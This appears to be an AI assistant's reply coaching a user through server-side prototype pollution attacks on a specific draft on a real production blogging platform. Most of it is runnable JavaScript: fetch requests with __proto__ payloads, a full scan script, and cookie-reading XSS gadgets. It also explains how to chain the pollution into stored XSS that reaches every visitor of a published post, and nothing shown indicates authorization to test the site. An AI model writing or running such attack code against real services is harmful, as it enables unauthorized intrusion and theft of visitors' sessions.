

## Breakthrough Analysis

Look at your draft response:
```json
"contentMarkdown": "const payload = JSON.parse('{\"**proto**\":{\"innerHTML\":\"\n\n![](x align=\"center\")\n\n\"}}');",
```

The `contentMarkdown` field **stores your payload as text** — it's not being executed. The server is just storing whatever you type. The prototype pollution needs to happen at a **different level** — not in the content field, but in the **draft metadata** or **API request parameters**.

## The Real Attack: Server-Side Prototype Pollution via the API

Since you have access to `PUT /api/drafts/{id}`, the real test is:

### Step 1: Test Server-Side Pollution via PUT Request

When you update the draft, the server likely merges your request body into a draft object. Test with `__proto__` at the root level:

```javascript
// Use fetch to update the draft with __proto__ in the body
fetch('https://hashnode.com/api/drafts/6a26b23b5557747c5c330fbc', {
    method: 'PUT',  // or PATCH
    headers: {
        'Content-Type': 'application/json',
        // Include your auth cookies (they should be sent automatically)
    },
    credentials: 'include',
    body: JSON.stringify({
        title: "Test",
        contentMarkdown: "# Hello",
        __proto__: {
            testProp: "POLLUTED_" + Date.now()
        }
    })
})
.then(r => r.json())
.then(data => {
    console.log('Response:', data);
    // Check if testProp appears in the response
    if (JSON.stringify(data).includes('POLLUTED')) {
        console.log('✅ PROTOTYPE POLLUTION CONFIRMED ON SERVER!');
    }
});
```

### Step 2: Test via Query Parameters on the PUT request

```javascript
// Test if query parameters get merged
fetch('https://hashnode.com/api/drafts/6a26b23b5557747c5c330fbc?__proto__[testProp]=POLLUTED', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
        title: "Test",
        contentMarkdown: "# Hello"
    })
})
.then(r => r.json())
.then(console.log);
```

### Step 3: Test the status/statusCode gadget

If the server merges your input, try polluting HTTP response properties:

```javascript
fetch('https://hashnode.com/api/drafts/6a26b23b5557747c5c330fbc', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
        title: "Test",
        contentMarkdown: "# Hello",
        __proto__: {
            status: 555,
            statusCode: 555
        }
    })
})
.then(r => {
    console.log('Status:', r.status);
    return r.json();
})
.then(console.log);
```

If the response status changes to `555`, you've confirmed server-side pollution.

### Step 4: The JSON Spaces Gadget (Classic Node.js Test)

```javascript
fetch('https://hashnode.com/api/drafts/6a26b23b5557747c5c330fbc', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
        title: "Test",
        contentMarkdown: "# Hello",
        __proto__: {
            jsonSpaces: 10  // If response is heavily indented, pollution works
        }
    })
})
.then(r => r.json())
.then(data => {
    // Compare formatting — if it's 10-space indented, pollution confirmed
    console.log('Response:', JSON.stringify(data, null, 2));
});
```

### Step 5: The content-type Charset Gadget

```javascript
// Test if we can override content-type
fetch('https://hashnode.com/api/drafts/6a26b23b5557747c5c330fbc', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
        title: "Test",
        contentMarkdown: "# Hello",
        __proto__: {
            "content-type": "text/html; charset=utf-7"
        }
    })
})
.then(r => {
    console.log('Content-Type header:', r.headers.get('content-type'));
    return r.text();
})
.then(console.log);
```

### Step 6: Full Server-Side Scan Script

Run this on your draft page while authenticated:

```javascript
console.log('=== SERVER-SIDE PP SCAN ===');
console.log('Target:', 'https://hashnode.com/api/drafts/6a26b23b5557747c5c330fbc');
console.log('');

const tests = [
    { name: 'status', payload: { __proto__: { status: 555 } } },
    { name: 'statusCode', payload: { __proto__: { statusCode: 555 } } },
    { name: 'jsonSpaces', payload: { __proto__: { jsonSpaces: 10 } } },
    { name: 'content-type', payload: { __proto__: { 'content-type': 'text/html' } } },
    { name: 'body', payload: { __proto__: { body: 'POLLUTED_BODY' } } },
    { name: 'testProp', payload: { __proto__: { testProp: 'POLLUTED_' + Date.now() } } }
];

async function runTests() {
    for (const test of tests) {
        console.log(`Testing ${test.name}...`);
        try {
            const res = await fetch('https://hashnode.com/api/drafts/6a26b23b5557747c5c330fbc', {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                body: JSON.stringify({
                    title: "Test",
                    contentMarkdown: "# test",
                    ...test.payload
                })
            });
            
            const data = await res.json();
            const dataStr = JSON.stringify(data);
            
            if (dataStr.includes('POLLUTED') || dataStr.includes('555') || dataStr.includes('text/html')) {
                console.log(`  ✅ ${test.name}: POLLUTION CONFIRMED!`);
                console.log('  Response:', dataStr.substring(0, 300));
            } else {
                console.log(`  ❌ ${test.name}: No pollution detected`);
            }
        } catch(e) {
            console.log(`  ❌ ${test.name}: Error -`, e.message);
        }
    }
    
    // Check after tests if the pollution persisted
    console.log('');
    console.log('Checking if pollution persisted...');
    const res = await fetch('https://hashnode.com/api/drafts/6a26b23b5557747c5c330fbc', {
        credentials: 'include'
    });
    const data = await res.json();
    const dataStr = JSON.stringify(data);
    if (dataStr.includes('POLLUTED')) {
        console.log('⚠️ POLLUTION PERSISTED ACROSS REQUESTS!');
        console.log('This is a SERVER-SIDE PROTOTYPE POLLUTION vulnerability.');
    } else {
        console.log('No persistence detected (good sign — server is safe).');
    }
}

runTests();
```

### Step 7: Test via GraphQL (if Hashnode uses it)

```javascript
fetch('https://api.hashnode.com/graphql', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
        query: `
            mutation UpdateDraft($draftId: ID!, $draft: DraftInput!) {
                updateDraft(draftId: $draftId, draft: $draft) {
                    _id
                    title
                    contentMarkdown
                }
            }
        `,
        variables: {
            draftId: "6a26b23b5557747c5c330fbc",
            draft: {
                title: "Test",
                contentMarkdown: "# Hello",
                __proto__: {
                    innerHTML: "<img src=x onerror=alert(1)>"
                }
            }
        }
    })
})
.then(r => r.json())
.then(console.log);
```

---

## How to Chain to Stored XSS (If Server-Side Pollution Works)

If the server accepts `__proto__` in the merge, the stored XSS chain would be:

1. **Pollute via API**: Send `__proto__` with a property that the **server-side rendering** reads when generating the blog post HTML
2. **Server-side gadget**: The server reads a property like `contentMarkdown`, `renderedHtml`, or some config property that ends up in the rendered HTML
3. **Every visitor affected**: When anyone visits the published post, the server renders HTML containing your payload

### Server-Side XSS Gadgets to Try

```javascript
// If server-side pollution works, try these gadgets:
const gadgetTests = [
    { "contentMarkdown": "<img src=x onerror=alert(document.cookie)>" },
    { "renderedHtml": "<img src=x onerror=alert(document.cookie)>" },
    { "html": "<img src=x onerror=alert(document.cookie)>" },
    { "body": "<img src=x onerror=alert(document.cookie)>" },
    { "coverImage": "javascript:alert(1)" }
];

// Wrap them in __proto__
gadgetTests.forEach(gadget => {
    const payload = {
        title: "Test",
        __proto__: gadget
    };
    console.log('Testing:', JSON.stringify(payload));
});
```

---

## Summary for Your Hashnode Draft

| Test | Method | Expected Result |
|------|--------|----------------|
| Console `Object.prototype.innerHTML = ...` | ✅ Works | But no client-side gadget reads it |
| `?__proto__[innerHTML]=...` (URL) | ❌ No effect | Hashnode doesn't parse query into client merge |
| `#__proto__[innerHTML]=...` (hash) | ❓ Untested | Unlikely for Next.js |
| API `PUT /api/drafts/{id}` with `__proto__` | ❓ **Most promising** | Tests if server merges request body |
| GraphQL with `__proto__` in variables | ❓ Possible | If GraphQL resolver does deep merge |

**The critical test is the server-side one.** Can you run Step 6 (the Full Server-Side Scan Script) on your authenticated draft page and share the results? That will tell us conclusively if Hashnode's API is vulnerable to server-side prototype pollution.